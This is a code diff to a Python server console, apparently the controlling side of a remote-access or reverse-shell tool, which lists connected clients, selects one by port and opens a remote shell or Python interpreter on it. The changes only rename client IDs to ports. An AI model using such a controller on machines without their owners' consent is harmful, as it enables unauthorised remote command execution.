@@ -108,8 +108,10 @@ class ServerCLI(BaseServer, cmd.Cmd):
         # Ensure clients don't get removed mid loop
         clients = self.clients().copy()
 
-        # Find a client.id starting with select_id, default None
-        self.client = next((client for client in clients if client.id.startswith(select_id)), None)
+        # Find a client.port starting with select_id, default None
+        self.client = next(
+            (client for client in clients if str(client.port).startswith(select_id)),
+            None)
 
         if self.client is None:
             print('Invalid port')
@@ -128,9 +130,8 @@ class ServerCLI(BaseServer, cmd.Cmd):
 
     def do_list(self, _) -> None:
         """ CLI for list """
-        clients = self.clients()
-        for client in clients:
-            print(f'Port: {client.id} / Address: {client.address[0]}')
+        for client in self.clients():
+            print(f'Port: {client.port} / Address: {client.address[0]}')
 
     def do_shell(self, _) -> None:
         """ Open a shell to client """
@@ -143,7 +144,7 @@ class ServerCLI(BaseServer, cmd.Cmd):
         # Generate client platform specific prompt
         prompt = terminal.make_prompt(self.client, cwd)
 
-        logging.debug('Launched shell (%s)', self.client.id)
+        logging.debug('Launched shell (%s)', self.client.port)
         while True:
             command = input(prompt)
 
@@ -166,7 +167,7 @@ class ServerCLI(BaseServer, cmd.Cmd):
             try:
                 print(shells.shell(self.client, command), end="")
             except TimeoutError:
-                logging.error("Shell command timed out: %s", self.client.id)
+                logging.error("Shell command timed out: %s", self.client.port)
                 # Prompt user to increase timeout limit
                 if not terminal.increase_timeout_prompt():
                     continue
@@ -178,7 +179,7 @@ class ServerCLI(BaseServer, cmd.Cmd):
         if self.__check_select():
             return
 
-        logging.debug('Launched python interpreter (%s)', self.client.id)
+        logging.debug('Launched python interpreter (%s)', self.client.port)
         while True:
             command = input('>>> ')
 
@@ -374,7 +375,7 @@ if __name__ == '__main__':
 
     # Get a client that connected
     connection = server.connections_queue.get()
-    print(connection.id.encode())
+    print(f"{connection.port}".encode())
 
     # Start Server CLI
     while True:
